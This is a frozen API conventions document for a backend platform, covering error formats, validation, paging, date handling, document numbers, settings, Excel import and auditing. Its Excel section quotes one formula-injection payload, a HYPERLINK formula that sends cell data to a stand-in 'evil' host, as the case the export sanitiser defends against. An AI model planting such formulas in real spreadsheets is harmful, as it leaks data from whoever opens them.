# API conventions (platform kernel)

**Status:** FROZEN by W1-3, 2026-09-18. Every wave-2 backend track and every wave-3 frontend track
builds on this document. Changing anything here means changing 40+ tracks — raise it with the lead
first.

Scope: the error contract, validation, paging, date/time, document numbers, dynamic settings, bulk
Excel import and the bulk audit scope. Per-module endpoint lists live in
`docs/api-contracts/<module>.md`, written by the track that owns the module.

Everything below lives in `backend/BuildingBlocks/`. Do not re-implement any of it in a module.

---

## 1. Error contract

**One shape for every 4xx and 5xx**, RFC 9457 `application/problem+json`, built in exactly one place:
`BuildingBlocks/Endpoints/ProblemDetailsFactory.cs`.

```json
{
  "type":     "https://httpstatuses.io/400",
  "title":    "Validation Failed",
  "status":   400,
  "code":     "VALIDATION_FAILED",
  "instance": "/api/catalog/products",
  "traceId":  "00-4bf92f...-01",
  "error":    "Dữ liệu gửi lên không hợp lệ. Vui lòng kiểm tra lại.",
  "message":  "Dữ liệu gửi lên không hợp lệ. Vui lòng kiểm tra lại.",
  "errors": [
    { "field": "email", "code": "NotEmptyValidator", "message": "Email là bắt buộc." }
  ]
}
```

| key | always present | notes |
|---|---|---|
| `type` `title` `status` `instance` `traceId` | yes | `title` is stable English, for logs. `traceId` is what a user quotes in a bug report. |
| `code` | yes | **Branch on this**, never on the Vietnamese sentence. Values: `ApiErrorCodes`. |
| `error` `message` | yes | Same Vietnamese text twice. Legacy keys 99 SPA call sites already read; they stay. |
| `errors` | only when field-level | Array of `{field, code, message}`. Omitted when empty — never `null`, never `{}`. |
| `detail` | Development only | Raw exception text. Outside Development the body carries **no** exception text, SQL, table or column name. |

`field` is the camelCase JSON path the client sent: `email`, `address.street`, `items[0].sku` — so
react-hook-form can map it straight onto a field name.

### Codes and statuses

| `code` | HTTP | raised by |
|---|---|---|
| `VALIDATION_FAILED` | 400 | the validation filter, `RequestValidationException`, `ArgumentException` |
| `BAD_REQUEST` | 400 | malformed JSON / missing query parameter |
| `DOMAIN_RULE` | 400 | `DomainException` — a business rule |
| `INVALID_REFERENCE` | 400 | PG `23503` foreign_key_violation |
| `MISSING_REQUIRED_FIELD` | 400 | PG `23502` not_null_violation |
| `INVALID_VALUE` | 400 | PG `23514` check_violation |
| `VALUE_TOO_LONG` | 400 | PG `22001` string_data_right_truncation |
| `UNAUTHORIZED` | 401 | no / invalid token |
| `FORBIDDEN` | 403 | `ForbiddenException`, permission policy |
| `NOT_FOUND` | 404 | `NotFoundException` |
| `CONFLICT` | 409 | `ConflictException`, PG `23P01` |
| `DUPLICATE_VALUE` | 409 | PG `23505` unique_violation |
| `CONCURRENCY_CONFLICT` | 409 | `DbUpdateConcurrencyException` |
| `TIMEOUT` | 504 | `TimeoutException` |
| `INTERNAL_ERROR` | 500 | everything else |

**A violated database constraint is never a 500.** `DatabaseExceptionMapper` turns SQLSTATE class 23
and `22001` into 4xx before the generic handler sees them.

### How a handler reports a failure

Throw; do not hand-build a body.

```csharp
throw NotFoundException.For("đơn hàng", id);                       // 404
throw new ConflictException("Đơn hàng đã được thanh toán.");        // 409
throw new ForbiddenException();                                     // 403
throw new DomainException("Không thể huỷ đơn đã giao.");            // 400
throw new RequestValidationException("sku", "Mã SKU đã tồn tại.");  // 400 + errors[]
```

A `DomainException` message **is user-facing copy in every environment** — write it in Vietnamese and
never build it from exception or SQL text. Everything that is *not* a `DomainException` gets a
generic Vietnamese message outside Development, plus the `traceId`.

### Frontend

`normalizeApiError` (W1-9 / W1-13) reads `code` first, `errors[]` for field mapping, and
`message` for display. It must tolerate `errors` being absent.

---

## 2. Validation

`FluentValidation`. One `AbstractValidator<TDto>` per write DTO, in the owning module. Register with
`services.AddApplicationValidators()` (already called by the host — it scans the module assemblies).

```csharp
app.MapPost("/api/catalog/products", Handler)
   .WithValidation<CreateProductDto>();
```

`WithValidation<T>()` **fails at startup** if no `IValidator<T>` is registered
(`ValidatorRegistrationGuard`, an `IHostedService` that runs after endpoint mapping). Before this the
filter silently forwarded everything, so an endpoint could stop validating and nothing said so.

Failure body: 400, `code = VALIDATION_FAILED`, one `errors[]` entry per rule failure. The per-field
`code` is FluentValidation's rule name (`NotEmptyValidator`, `EmailValidator`, …); override it with
`.WithErrorCode("SKU_TAKEN")` when the frontend needs to branch. Messages are Vietnamese —
`VietnameseValidationMessages` has the common ones.

Rules that need the database (uniqueness, cross-aggregate state) belong in the handler, thrown as
`RequestValidationException` so the body shape is identical.

---

## 3. Paging

Query string, identical on **every** list endpoint:

```
?page=1&pageSize=20&search=ssd&sortBy=name&sortDir=asc
```

| parameter | default | rules |
|---|---|---|
| `page` | 1 | clamped to ≥ 1 |
| `pageSize` | 20 | clamped to 1..**100** — a caller cannot ask for the whole table |
| `search` | – | free text, meaning documented per endpoint |
| `sortBy` | – | must be in the endpoint's allow-list, otherwise ignored |
| `sortDir` | `asc` | `desc` (case-insensitive) or `asc` |

```csharp
app.MapGet("/api/catalog/products", async ([AsParameters] PagedRequest request, CatalogDbContext db, CancellationToken ct) =>
{
    var sortable = new Dictionary<string, Expression<Func<Product, object?>>>
    {
        ["name"] = p => p.Name,
        ["price"] = p => p.Price
    };

    return Results.Ok(await db.Products
        .Where(p => request.NormalizedSearch == null || p.Name.Contains(request.NormalizedSearch))
        .ApplySort(request, sortable, p => p.CreatedAt)
        .Select(p => new ProductListItemDto(/* ... */))
        .ToPagedResultAsync(request, ct));
});
```

`PagedRequest` binds with `[AsParameters]`; every property is nullable so a bare
`GET /api/catalog/products` is valid (a non-nullable `[AsParameters]` property is a *required* query
parameter in ASP.NET Core — that is what used to return 400 for an empty query string).

`ApplySort` takes an **allow-list**, never a reflected property name: a caller-controlled `ORDER BY`
is both an injection surface and an unbounded sequential scan. It always applies a default sort — an
unordered `Skip/Take` has no defined row order in PostgreSQL and silently repeats or drops rows
across pages.

`ToPagedResultAsync` applies `AsNoTracking()` and counts the filtered set before `Skip/Take`.
Response body (`BuildingBlocks.Repository.PagedResult<T>` — the one that already exists; do not
declare a second one):

```json
{ "items": [], "total": 137, "page": 2, "pageSize": 20,
  "totalPages": 7, "hasPreviousPage": true, "hasNextPage": true }
```

---

## 4. Date and time

- **Store UTC. Compare in Vietnam local time.** `Asia/Ho_Chi_Minh`, UTC+7, no DST since 1975.
- The business date of an instant is its date *in VN local time*: `2026-01-01T23:30Z` is business
  date **2026-01-02**. Attendance was 7 hours wrong because UTC instants were compared with local
  shift times.
- `IBusinessClock` (`BuildingBlocks/Time/`) is owned by **W1-15**; use it as soon as it lands.
  Until then, convert explicitly with a fixed `+07:00` offset — never
  `DateTime.Now`, never the host's local time zone.
- JSON: ISO-8601 with the offset. `UtcDateTimeJsonConverter` stamps `Z` on `DateTime` values that
  carry no kind.

---

## 5. Document numbers

Format **`PREFIX-yyyyMM-#####`** — `PO-202609-00042`. The month is Vietnam local, so a document
created at 08:30 on the 1st (01:30 UTC) is numbered in the new month.

```csharp
var number = await documentNumbers.NextAsync(DocumentNumberTypes.PurchaseOrder, ct);
```

| type | prefix | | type | prefix |
|---|---|---|---|---|
| `po` | PO | | `rfq` | RFQ |
| `grn` | GRN | | `ret` | RET |
| `dn` | DN | | `pay` | PAY |
| `rma` | RMA | | `so` | SO |
| `inv` | INV | | `bg` | BG (báo giá, D10) |
| `wo` | WO | | `tr` | TR |
| `pr` | PR | | | |

Backed by one PostgreSQL sequence per type, `docnum_<type>_seq`, migrated by **W1-11**. `nextval` is
transaction-independent: it never blocks and never hands the same value to two callers. **Gaps are
expected and fine** — the number identifies a document, it does not count them. Never reset a
sequence per month; the counter is global per type, which keeps numbers unique with no scheduled job.

Never use `DateTime.Now` + an in-process counter: it restarts at 1 on deploy, is per-process, and
produced numbers the unique index then rejected as a 500.

Proof: `plans/.../reports/probes/W1-3-document-number-concurrency.sh` — 10 concurrent sessions ×
1.000 `nextval` = 10.000 distinct values.

---

## 6. Dynamic settings

`IAppSettings` reads the admin-editable `SystemConfig.Configurations` table with a compile-time
default next to every call:

```csharp
var threshold = settings.GetDecimal("Shipping:FreeThreshold", 500_000m);
var slaHours  = settings.GetInt("Repair:SlaHours", 48);
```

- Parsing is **`InvariantCulture`** everywhere. The server runs with a Vietnamese culture in places,
  where `,` is the decimal separator — a culture-sensitive parse turns a rate of `"0.1"` into `1`.
  Storage and parsing are invariant; only *display* is localised.
- The whole table is cached for 60 s in process. Call `Invalidate()` from whatever writes a
  configuration row.
- A module that owns the configuration table registers an `IAppSettingsStore`; with none registered
  every call returns its fallback (documented degraded behaviour, not a crash).
- **Stop hardcoding what the admin screen edits.** Shipping thresholds, repair fees, SLA hours and
  lockout policy are all in that table and were all duplicated in C#, so editing the screen changed
  nothing.

---

## 7. Bulk Excel import (D10)

`ExcelImportPipeline<TRow>` in `BuildingBlocks/Spreadsheet/` is the only import path. ClosedXML
0.104.1 is referenced once, by BuildingBlocks — do not add a second version.

```csharp
var pipeline = new ExcelImportPipeline<PriceRow>(new[]
{
    ExcelImportColumn<PriceRow>.Text("Mã SKU", (r, v) => r.Sku = v ?? "", required: true),
    new ExcelImportColumn<PriceRow>("Giá bán", (r, v) => /* return null or a Vietnamese message */, hint: "VND")
});

var result = pipeline.Read(uploadStream);   // throws InvalidDataException -> 400, message verbatim
if (!result.IsValid) return Results.File(pipeline.BuildErrorWorkbook(result), XlsxContentType, "loi.xlsx");
```

- A row with any error is **not** imported — partial imports corrupt data.
- Limits: 5 MB and 5.000 rows, checked before decompression.
- `BuildErrorWorkbook` returns only the failed rows plus a trailing `Lỗi` column, so re-uploading it
  imports exactly what was missing.
- **Every exported cell goes through `ExcelSafeText.Neutralize`.** A stored
  `=HYPERLINK("http://evil/?d="&A1,"Nhấp")` executes when a staff member opens the export (CWE-1236);
  a leading apostrophe makes the cell literal.

---

## 8. Audit

The EF interceptor audits every changed entity automatically — do not add manual audit calls for
ordinary writes.

- **Credential values never reach an audit row.** `AuditSaveChangesInterceptor.IsSecretProperty` plus
  `AuditSecretScrubber` at the insert point. Property *names* survive ("PasswordHash changed" is
  legitimate audit information); values do not.
- **Role and claim membership IS audited** (`AspNetUserRoles`, `AspNetUserClaims`) — it is the
  authorization state of the system and must never change silently.
- **Wrap every bulk write in `AuditScope.Bulk`:**

  ```csharp
  using (AuditScope.Bulk("Nhập sản phẩm", fileName))
  {
      db.Products.AddRange(rows);
      await db.SaveChangesAsync(ct);
  }
  ```

  Inside the scope the interceptor writes one summary row (actor, file, row count, split by
  create/update/delete) per `SaveChanges` instead of one JSON document per entity.

---

## 9. Cross-module lookups

A module never references another module. `IUserDirectory` (`BuildingBlocks/Contracts/`) is the only
way to resolve a person outside Identity: `GetByIdsAsync` (batched — do not query per row),
`SearchCustomersAsync`, `ProvisionCustomerAsync` (idempotent). Implemented by W1-2 inside Identity.
It exposes no credentials, roles or claims; authorization is the permission policies' job.
